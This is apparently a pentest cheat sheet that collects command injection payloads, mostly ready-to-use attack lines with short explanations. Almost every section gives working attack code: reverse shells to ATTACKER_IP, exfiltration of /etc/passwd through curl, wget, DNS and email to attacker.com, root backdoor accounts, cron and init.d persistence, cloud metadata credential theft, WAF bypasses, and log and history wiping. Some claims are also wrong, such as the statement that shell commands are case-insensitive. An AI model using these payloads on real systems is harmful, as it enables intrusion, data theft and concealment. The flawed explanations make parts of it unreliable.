### Command Injection - Extended Payloads Collection

**Command Injection** is a critical security vulnerability that allows attackers to execute arbitrary commands on the host operating system through a vulnerable application. This occurs when user inputs are improperly sanitized and passed directly to system shell commands.

* **Injection Point:** Occurs when user-supplied input is concatenated into system commands without proper validation or escaping.
* **Impact:** Can lead to full system compromise, data theft, and further network penetration.
* **Common Targets:** Web applications, APIs, and services that execute system commands based on user input.
* **Root Cause:** Lack of input validation, improper escaping of shell metacharacters, and unsafe use of system() or exec() functions.

-----

### Basic Injection Operators

These operators allow command chaining and execution in Unix/Linux environments. They work because these characters are part of the shell's syntax for controlling command execution flow.

#### Sequential Execution

```bash
; # Runs commands one after another
```

* **Why it's used:** To execute multiple commands in sequence regardless of previous command success.
* **How it works:** The semicolon separates commands in a single line.

#### Background Execution

```bash
& # Runs command in background
```

* **Why it's used:** To run commands asynchronously while the main process continues.
* **How it works:** The ampersand tells the shell to run the preceding command in the background.

#### Conditional Execution

```bash
&& # AND operator - runs next command only if previous succeeds
|| # OR operator - runs next command only if previous fails
```

* **Why it's used:** To conditionally execute commands based on success/failure of previous ones.
* **How it works:** Logical operators that control command flow based on exit codes.

#### Piping and Substitution

```bash
|          # Pipe operator - sends output of one command to another
`command`  # Backticks - executes command and returns output
$(command) # Dollar parentheses - modern command substitution
```

* **Why it's used:** To chain commands and capture output for further processing.
* **How it works:** Pipe redirects stdout to stdin of next command; backticks and $() capture command output.

#### Line Separators

```bash
\n  # Newline - can separate commands in some contexts
\r  # Carriage return - alternative command separator
%0a # URL encoded newline - useful in web applications
%0d # URL encoded carriage return - alternative separator in web apps
```

* **Why it's used:** To inject commands where spaces or semicolons might be filtered.
* **How it works:** These characters are interpreted as command separators by the shell.

-----

### String Obfuscation Payloads

String obfuscation techniques are essential for bypassing pattern-based detection systems that look for specific command names. These methods break up command strings to avoid simple keyword matching.

#### Character Splitting

```bash
w'h'o'a'm'i
w"h"o"a"m"i
w\h\o\a\m\i
w*h*o*a*m*i
who$(printf am)i
who`echo am`i
```

* **Why it's used:** To bypass filters that look for complete command strings.
* **How it works:** Shell interprets these as valid command execution despite special characters.

#### Case Variation

```bash
WhOaMi
WhoAmI
WHOAMI
wHoAmI
```

* **Why it's used:** To bypass case-sensitive filters.
* **How it works:** Shell commands are generally case-insensitive; these variations execute the same command.

#### Reverse Strings

```bash
$(rev<<<'imaohw')
$(echo 'whoami' | rev)
```

* **Why it's used:** To bypass filters that look for commands in their standard form.
* **How it works:** Reverses the string and executes it through command substitution.

-----

### Environment Variable Payloads

Environment variables can be used to dynamically construct commands, making them harder to detect through static analysis. Many security solutions look for complete command strings, and by breaking commands into parts using environment variables, we can bypass simple pattern matching.

#### Variable Expansion

```bash
${SHELL:0:1}ho${#?}am${*?}
${HOME:0:1}bin${HOME:0:1}whoami
${PATH:0:1}${PATH:4:1}n${PATH:4:1}whoami
```

* **Why it's used:** To construct commands dynamically from existing environment variables.
* **How it works:** Uses substring extraction and special parameter expansion to build command strings.

#### Character Extraction

```bash
echo "${LSCOLORS:4:1}${LSCOLORS:14:1}${LS_COLORS:979:1}"
for x in $(seq 1 1000); do echo "$x: ${LS_COLORS:$x:1}"; done
```

* **Why it's used:** To discover available characters in environment variables for payload construction.
* **How it works:** Iterates through environment variables to find usable characters for building commands.

-----

### IFS and Space Bypass Payloads

The Internal Field Separator (IFS) is a special variable that defines field separators in the shell. By manipulating IFS, attackers can execute commands without using spaces, which are commonly filtered.

#### Space Alternatives

```bash
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat<<</etc/passwd
```

* **Why it's used:** To execute commands without using actual space characters.
* **How it works:** Uses alternative shell syntax and IFS variable to separate command arguments.

#### IFS Manipulation

```bash
IFS=,;`echo who,ami`
$(IFS=,;echo who,ami)
IFS=$'\n'; cmd
IFS=$'\t'; cmd
IFS=$' \t\n'; cmd
```

* **Why it's used:** To change how the shell splits arguments, enabling space-less execution.
* **How it works:** Temporarily changes the field separator to commas, tabs, or newlines.

-----

### Encoding Payloads

Encoding techniques transform commands into different representations that can bypass security filters. The shell processes these encoded commands before execution, converting them back to their original form.

#### Base64 Encoding

```bash
echo 'd2hvYW1pCg==' | base64 -d | bash
$(echo "d2hvYW1p" | base64 -d)
echo 'ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWw=' | base64 -d | bash
```

* **Why it's used:** To obfuscate commands as base64 strings that evade string matching.
* **How it works:** Encodes commands in base64, then decodes and pipes to shell for execution.

#### Hex Encoding

```bash
$(echo $'\x77\x68\x6f\x61\x6d\x69')
$(printf "\x77\x68\x6f\x61\x6d\x69")
echo -e '\x77\x68\x6f\x61\x6d\x69' | bash
printf '\x77\x68\x6f\x61\x6d\x69' | bash
```

* **Why it's used:** To represent commands using hexadecimal ASCII values.
* **How it works:** Uses hex escape sequences that the shell or printf converts to ASCII characters.

#### ROT13 Encoding

```bash
$(echo 'jblznv' | tr 'a-zA-Z' 'n-za-mN-ZA-M')
$(tr 'a-zA-Z' 'n-za-mN-ZA-M' <<< 'jblznv')
```

* **Why it's used:** Simple cipher that can bypass basic keyword filters.
* **How it works:** Rotates letters by 13 positions using tr command.

-----

### Command-Specific Bypass Payloads

These payloads demonstrate various bypass techniques for common system commands. Each command is shown with multiple obfuscation methods to evade different types of filters.

#### ls Command

```bash
ls /etc
l\s /etc
l${IFS}s /etc
$(echo 'ls') /etc
{ls,/etc}
ls$@ /etc
ls${PS2} /etc
```

* **Why it's used:** Multiple ways to execute the ls command while bypassing filters.
* **How it works:** Various obfuscation techniques applied to the ls command.

#### cat Command

```bash
cat /etc/passwd
c\a\t /etc/passwd
c${IFS}at /etc/passwd
$(echo 'cat') /etc/passwd
{cat,/etc/passwd}
cat$@ /etc/passwd
cat${PS2} /etc/passwd
```

* **Why it's used:** Various techniques to read files using cat command with obfuscation.
* **How it works:** Different methods to execute cat while evading detection.

#### File Reading Alternatives

```bash
head -n 100 /etc/passwd
awk '{print}' /etc/passwd
sed -n '1,100p' /etc/passwd
perl -ne 'print if /root/' /etc/passwd
python -c "print(open('/etc/passwd').read())"
```

* **Why it's used:** Alternative commands and methods to read files when standard approaches are blocked.
* **How it works:** Uses different Unix utilities and scripting languages to access file contents.

-----

### Network and Reconnaissance Payloads

These commands help attackers gather system and network information during the reconnaissance phase. Understanding the target environment is crucial for successful exploitation.

#### System Information

```bash
uname -a
cat /etc/issue
cat /proc/version
lsb_release -a
ps aux
ps -ef
```

* **Why it's used:** To gather operating system and system configuration details.
* **How it works:** Standard Unix commands for system discovery and enumeration.

#### Network Information

```bash
ifconfig
ip addr
netstat -tuln
netstat -ano
ss -tuln
route
ip route
cat /etc/resolv.conf
```

* **Why it's used:** To discover network configuration and connections.
* **How it works:** Network utilities that reveal interfaces, connections, and routing information.

-----

### Reverse Shell Payloads

Reverse shells establish a connection back to the attacker's machine, providing remote command execution capabilities. These are essential for maintaining access to compromised systems.

#### Basic Reverse Shells

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
nc -e /bin/bash ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

* **Why it's used:** Standard reverse shell techniques using common Unix utilities.
* **How it works:** Creates a shell that connects back to the attacker's listening socket.

#### Python Reverse Shells

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* **Why it's used:** Python-based reverse shells that work in environments with Python installed.
* **How it works:** Python script that creates a socket connection and spawns a shell.

#### Encoded Reverse Shells

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | base64 | bash
printf 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | bash
```

* **Why it's used:** Reverse shells with encoding to bypass content filters and detection systems.
* **How it works:** Encodes the reverse shell command to evade string-based detection.

-----

### Data Exfiltration Payloads

These payloads are designed to extract sensitive data from compromised systems. Exfiltration techniques vary based on available tools and network configurations.

#### curl Exfiltration

```bash
curl -X POST -d @"$file" https://webhook.site/unique-id
curl https://webhook.site/unique-id?data=$(whoami|base64)
curl -H "Content-Type: application/json" -d "{\"data\":\"$(cat /etc/passwd)\"}" http://attacker.com
```

* **Why it's used:** Using curl to send data to external servers through various HTTP methods.
* **How it works:** Transfers file contents or command output via HTTP requests.

#### wget Exfiltration

```bash
wget "http://attacker.com/$(cat /etc/passwd|base64)"
wget --post-data="data=$(cat /etc/passwd)" http://attacker.com
wget --header="X-Data: $(cat /etc/passwd|base64)" http://attacker.com
```

* **Why it's used:** Using wget as an alternative to curl for data exfiltration.
* **How it works:** Similar to curl but using wget's different syntax for data transfer.

#### DNS Exfiltration

```bash
nslookup $(whoami).attacker.com
dig $(cat /etc/passwd | base64).attacker.com
```

* **Why it's used:** Using DNS queries to exfiltrate data, which can bypass network monitoring that focuses on HTTP traffic.
* **How it works:** Embeds data in DNS query subdomains that get resolved through attacker-controlled DNS.

-----

### Privilege Escalation Payloads

These payloads help attackers elevate their privileges on compromised systems. Privilege escalation is often necessary to access sensitive data and system resources.

#### Sudo Exploitation

```bash
sudo -l
sudo /bin/bash
sudo su -
sudo find / -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
```

* **Why it's used:** Techniques to exploit misconfigured sudo permissions for privilege escalation.
* **How it works:** Leverages sudo access to execute commands with elevated privileges.

#### SUID Exploitation

```bash
find / -perm -4000 2>/dev/null
find . -exec /bin/bash -p \;
nano /etc/passwd
vim -c ':!/bin/bash'
less /etc/passwd
!/bin/bash
```

* **Why it's used:** Exploiting Set User ID (SUID) binaries to gain elevated privileges.
* **How it works:** Identifies and abuses binaries with SUID set to execute with owner privileges.

-----

### Persistence Payloads

Persistence mechanisms ensure continued access to compromised systems after initial exploitation. These techniques help maintain access even after system reboots or security updates.

#### User Creation

```bash
useradd -o -u 0 -g 0 backdooruser
echo "backdooruser:password" | chpasswd
```

* **Why it's used:** Creating backdoor user accounts for persistent access.
* **How it works:** Adds new users, potentially with root privileges, for future access.

#### Service Persistence

```bash
echo "nc -lvp 4444 -e /bin/bash" > /etc/init.d/backdoor
chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

* **Why it's used:** Installing persistent services that provide backdoor access.
* **How it works:** Creates system services that automatically start on boot.

#### Cron Persistence

```bash
echo "* * * * * root nc ATTACKER_IP PORT -e /bin/bash" >> /etc/crontab
(crontab -l ; echo "* * * * * nc ATTACKER_IP PORT -e /bin/bash") | crontab -
```

* **Why it's used:** Using cron jobs to maintain persistent access through scheduled execution.
* **How it works:** Adds scheduled tasks that regularly establish reverse shells or execute payloads.

-----

### Web Application Payloads

These payloads are specifically designed for web application command injection scenarios, where input is typically passed through HTTP parameters and headers.

#### URL Parameter Injection

```http
ip=127.0.0.1;whoami
ip=127.0.0.1|whoami
ip=127.0.0.1%0awhoami
ip=127.0.0.1%0dwhoami
ip=127.0.0.1%3Bwhoami
ip=127.0.0.1%7Cwhoami
ip=127.0.0.1%60whoami%60
```

* **Why it's used:** Command injection through URL parameters with various encoding techniques.
* **How it works:** Injects shell metacharacters into HTTP parameters that get passed to system commands.

#### HTTP Header Injection

```http
User-Agent: Mozilla/5.0; whoami
X-Forwarded-For: 127.0.0.1; whoami
Referer: http://site.com/; whoami
```

* **Why it's used:** Injecting commands through HTTP headers, which may be less monitored than parameters.
* **How it works:** Exploits applications that use header values in system commands without proper validation.

-----

### Advanced Obfuscation Payloads

Advanced obfuscation techniques provide additional layers of evasion for sophisticated security systems.

#### XOR Encoding

```bash
$(python3 -c "print(''.join(chr(ord(c)^42) for c in 'whoami'))")
$(python3 -c "exec(''.join(chr(ord(c)^42) for c in 'encoded_string'))")
```

* **Why it's used:** Using XOR operations to encode commands, providing stronger obfuscation.
* **How it works:** Applies XOR cipher to command strings, requiring decoding before execution.

#### Double Base64

```bash
echo 'd2hvYW1pCg==' | base64 -d | base64 -d | bash
```

* **Why it's used:** Multiple layers of base64 encoding for enhanced obfuscation.
* **How it works:** Applies base64 encoding twice to further hide command contents.

#### Custom Encoding

```bash
$(echo '77686F616D69' | xxd -r -p | bash)
$(uudecode <<< 'begin 644 /dev/stdout
M(1%3D
`
end')
```

* **Why it's used:** Alternative encoding methods including hex and uuencode.
* **How it works:** Uses different encoding schemes that may bypass specific filters.

-----

### Blind Command Injection Payloads

Blind command injection occurs when command output is not visible, requiring alternative techniques for detection and exploitation.

#### Time-Based Detection

```bash
ping -c 5 127.0.0.1
sleep 5
true && sleep 5
```

* **Why it's used:** Using time delays to confirm command execution without visible output.
* **How it works:** Commands that cause measurable delays indicate successful injection.

#### Output Redirection

```bash
whoami > /var/www/html/output.txt
curl http://attacker.com/$(whoami | base64)
```

* **Why it's used:** Redirecting command output to files or external services for later retrieval.
* **How it works:** Stores command results where they can be accessed later or sends them to attacker-controlled servers.

-----

### Windows-Specific Payloads

Command injection payloads specifically designed for Windows environments, accounting for differences in command syntax and available utilities.

#### Basic Windows Commands

```cmd
& whoami
| whoami
%0a whoami
powershell -c "whoami"
cmd /c whoami
```

* **Why it's used:** Windows command injection using CMD and PowerShell.
* **How it works:** Windows-specific command separators and shell invocation.

#### Windows File Reading

```cmd
type C:\Windows\System32\drivers\etc\hosts
```

* **Why it's used:** Reading files in Windows environments using native commands.
* **How it works:** Windows equivalent of cat command for file reading.

-----

### WAF Bypass Payloads

These payloads are designed to bypass Web Application Firewalls (WAFs) and other security filtering mechanisms.

#### Unicode Bypass

```bash
ｗｈｏａｍｉ
whoａmi
```

* **Why it's used:** Using Unicode characters that may be normalized to standard ASCII by the system.
* **How it works:** Unicode characters that look like ASCII but bypass string matching.

#### Double Encoding

```http
%2520whoami
%253Bwhoami
```

* **Why it's used:** Double URL encoding to bypass WAFs that decode input only once.
* **How it works:** Encodes the encoding characters themselves to evade single-layer decoding.

#### Mixed Case and Encoding

```bash
W$(echo hoami)
whoami''
whoami""
whoami\\
```

* **Why it's used:** Combining case variation with encoding techniques for enhanced evasion.
* **How it works:** Multiple obfuscation layers applied simultaneously.

-----

### Application-Specific Payloads

Payloads tailored for specific applications and technologies that may have unique command injection vectors.

#### Git Command Injection

```bash
email=test@test.com%0Acurl%09http://attacker.com/$(whoami)
git commit -m "fix; curl http://attacker.com/$(whoami)"
```

* **Why it's used:** Exploiting command injection in Git-related operations and webhooks.
* **How it works:** Targets Git configuration and commit messages that get processed by scripts.

#### SQL Command Injection

```sql
'; EXEC xp_cmdshell 'whoami' --
'; SYSTEM whoami; --
```

* **Why it's used:** When SQL injection vulnerabilities allow command execution through database functions.
* **How it works:** Leverages database functions that execute operating system commands.

#### PHP Command Injection

```php
'; system('whoami'); $dummy='
'; `whoami`; $dummy='
```

* **Why it's used:** Command injection specific to PHP applications and execution contexts.
* **How it works:** Exploits PHP's system() and backtick operators for command execution.

-----

### Automated Testing Payloads

Payloads designed for automated security testing tools and frameworks.

#### Burp Suite Intruder Payloads

```http
;
&
|
`
$(
%0a
%0d
%00
;whoami
&whoami  
|whoami
`whoami`
$(whoami)
%0awhoami
```

* **Why it's used:** Payload sets for use with Burp Suite Intruder for automated testing.
* **How it works:** Collection of common injection strings for fuzzing.

#### Comprehensive Test Sequence

```bash
# Phase 1: Detection
127.0.0.1; echo "TEST"
127.0.0.1 | echo "TEST"
127.0.0.1 `echo "TEST"`

# Phase 2: Verification  
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; uname -a

# Phase 3: Exploitation
127.0.0.1; cat /etc/passwd
127.0.0.1; nc -e /bin/bash ATTACKER_IP PORT

# Phase 4: Post-Exploitation
127.0.0.1; find / -perm -4000 2>/dev/null
127.0.0.1; crontab -l
```

* **Why it's used:** A methodological testing approach for command injection vulnerabilities.
* **How it works:** Progressive testing from detection to full exploitation.

-----

### Specialized File Targets

Critical files and directories that are commonly targeted during command injection attacks.

#### Sensitive Linux Files

```bash
/etc/passwd
/etc/shadow
/etc/hosts
/var/www/html/config.php
/var/log/auth.log
~/.bash_history
~/.ssh/id_rsa
~/.ssh/known_hosts
/var/www/html/.env
/var/www/html/config/database.php
/var/www/html/web.config
```

* **Why it's used:** Important system files that contain sensitive information.
* **How it works:** Targets files with credentials, configurations, and sensitive data.

#### System Discovery Commands

```bash
find / -type f -size +1000k 2>/dev/null
find / -name "*.log" -type f 2>/dev/null
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null 2>/dev/null
df -h
lsblk
```

* **Why it's used:** Commands to discover interesting files and system information.
* **How it works:** System enumeration to find valuable targets and weaknesses.

-----

### Advanced Command Chaining Techniques

Advanced command chaining allows attackers to execute complex sequences of commands while maintaining stealth and bypassing restrictions. These techniques combine multiple operators and obfuscation methods for sophisticated exploitation.

#### Nested Command Substitution

```bash
$( $(echo 'echo') $(echo 'whoami') )
` `echo 'whoami' ` `
$(eval $(echo 'whoami'))
```

* **Why it's used:** To create deeply nested command structures that evade simple parsing.
* **How it works:** Multiple layers of command substitution that execute dynamically.

#### Conditional Chaining with Error Handling

```bash
whoami && echo "Success" || echo "Failed"
id || whoami || pwd
```

* **Why it's used:** To execute fallback commands when primary commands fail.
* **How it works:** Uses logical operators to chain commands with error handling.

#### Background Process Management

```bash
(whoami &) && sleep 1 && kill %1
nohup whoami &
disown
```

* **Why it's used:** To run commands in background while maintaining control of the main process.
* **How it works:** Job control mechanisms to manage asynchronous command execution.

#### Pipeline with Redirection

```bash
whoami | tee /tmp/output | grep root
cat /etc/passwd | while read line; do echo $line; done
```

* **Why it's used:** To process command output through multiple stages.
* **How it works:** Combines piping with redirection for complex data processing.

-----

### Time-Based and Boolean-Based Blind Injection

Blind command injection requires alternative detection methods when output is not visible. Time-based techniques use delays, while boolean-based use conditional responses.

#### Time-Based Detection Techniques

```bash
sleep 5
ping -c 5 127.0.0.1
timeout 5 bash -c 'sleep 10'
```

* **Why it's used:** To detect injection by measuring response times.
* **How it works:** Commands that introduce measurable delays indicate successful execution.

#### Boolean-Based Detection

```bash
test -f /etc/passwd && echo "True" || echo "False"
[ -d /tmp ] && whoami
```

* **Why it's used:** To infer command execution through conditional responses.
* **How it works:** Uses test conditions to generate different outputs based on command success.

#### Advanced Time-Based Payloads

```bash
if [ $(whoami) = "root" ]; then sleep 5; fi
case $(id -u) in 0) sleep 10;; *) sleep 1;; esac
```

* **Why it's used:** Conditional time delays based on command results.
* **How it works:** Introduces delays only when specific conditions are met.

#### Out-of-Band Time Exfiltration

```bash
curl -m 5 http://attacker.com/$(sleep 3 && echo "delay")
wget --timeout=5 http://attacker.com/$(timeout 3 whoami)
```

* **Why it's used:** To exfiltrate timing information through external requests.
* **How it works:** Combines time delays with out-of-band communication.

-----

### Out-of-Band Command Injection

Out-of-band techniques send data to attacker-controlled servers when direct output is not possible. These methods are particularly useful in blind injection scenarios.

#### DNS Out-of-Band Exfiltration

```bash
nslookup `whoami`.attacker.com
dig `cat /etc/passwd | base64`.attacker.com
host `uname -a | tr ' ' '.'`.attacker.com
```

* **Why it's used:** To exfiltrate data through DNS queries, which often bypass firewalls.
* **How it works:** Embeds command output in DNS subdomains sent to attacker-controlled DNS servers.

#### HTTP Out-of-Band Techniques

```bash
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(id | base64)
curl -d "data=$(cat /etc/passwd)" http://attacker.com
```

* **Why it's used:** Direct HTTP requests to send data to external servers.
* **How it works:** Uses curl or wget to transmit command output via HTTP.

#### ICMP Out-of-Band

```bash
ping -c 1 -p $(echo -n "data" | od -An -tx1 | tr -d ' ') attacker.com
```

* **Why it's used:** To exfiltrate data through ICMP packets.
* **How it works:** Embeds data in ping packet payloads.

#### SMTP Out-of-Band

```bash
mail -s "Data" attacker@evil.com < /etc/passwd
sendmail attacker@evil.com < <(echo "Subject: Data"; cat /etc/passwd)
```

* **Why it's used:** Using email to exfiltrate data when other channels are blocked.
* **How it works:** Sends command output via email to attacker-controlled addresses.

-----

### Container and Cloud-Specific Payloads

Modern deployments often use containers and cloud environments, which have unique characteristics for command injection exploitation.

#### Docker Container Payloads

```bash
cat /proc/1/cgroup
docker ps
docker exec -it $(hostname) /bin/bash
```

* **Why it's used:** To exploit command injection in Docker environments.
* **How it works:** Leverages Docker-specific commands and container isolation.

#### Kubernetes Payloads

```bash
kubectl get pods
kubectl exec -it pod-name -- /bin/bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

* **Why it's used:** Command injection in Kubernetes clusters.
* **How it works:** Exploits kubectl and service account access.

#### AWS Lambda Payloads

```bash
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

* **Why it's used:** To access AWS metadata and credentials in Lambda functions.
* **How it works:** Queries AWS instance metadata service for sensitive information.

#### Cloud Function Payloads

```bash
gcloud auth list
gcloud compute instances list
```

* **Why it's used:** Exploiting command injection in cloud functions.
* **How it works:** Uses cloud provider CLI tools to enumerate resources.

-----

### Additional Encoding Techniques

Beyond basic encoding, these advanced techniques provide stronger obfuscation and bypass capabilities.

#### Gzip Compression

```bash
echo "whoami" | gzip | base64 -w 0 | xargs -0 sh -c 'echo "$0" | base64 -d | gunzip | bash'
```

* **Why it's used:** To compress commands for smaller payloads and additional obfuscation.
* **How it works:** Compresses commands with gzip, encodes, then decompresses for execution.

#### Custom Cipher Encoding

```bash
$(python3 -c "import base64; print(base64.b64decode('d2hvYW1p').decode())")
$(perl -e "print decode_base64('d2hvYW1p')")
```

* **Why it's used:** Using scripting languages for custom encoding/decoding.
* **How it works:** Leverages Python/Perl for base64 and other encoding schemes.

#### Binary Encoding

```bash
$(xxd -r -p <<< '77686f616d69')
$(od -An -tx1 /bin/whoami | xargs printf '\\x%s')
```

* **Why it's used:** Converting commands to binary representations.
* **How it works:** Uses xxd and od to create hex-encoded command strings.

#### Encrypted Payloads

```bash
openssl enc -aes-256-cbc -salt -in <(echo 'whoami') -k password | openssl enc -d -aes-256-cbc -k password | bash
```

* **Why it's used:** To encrypt commands for maximum obfuscation.
* **How it works:** Encrypts commands with OpenSSL, then decrypts for execution.

-----

### Anti-Forensic Payloads

These payloads are designed to avoid detection by forensic analysis and logging systems.

#### Log Evasion

```bash
whoami 2>/dev/null
exec whoami >/dev/null 2>&1
```

* **Why it's used:** To prevent command logging and output capture.
* **How it works:** Redirects output and errors to null devices.

#### History Manipulation

```bash
unset HISTFILE
export HISTSIZE=0
history -c
```

* **Why it's used:** To clear command history and prevent forensic analysis.
* **How it works:** Disables and clears shell history files.

#### Timestamp Manipulation

```bash
touch -t 202001010000 /var/log/auth.log
find /var/log -exec touch -t 202001010000 {} \;
```

* **Why it's used:** To alter file timestamps and confuse timeline analysis.
* **How it works:** Changes modification times of log files.

#### Memory-Based Execution

```bash
exec /bin/bash -c 'whoami' &
```

* **Why it's used:** To execute commands in memory without file artifacts.
* **How it works:** Runs commands in subprocesses that don't leave persistent traces.

-----

**Made with love by VIsh0k**
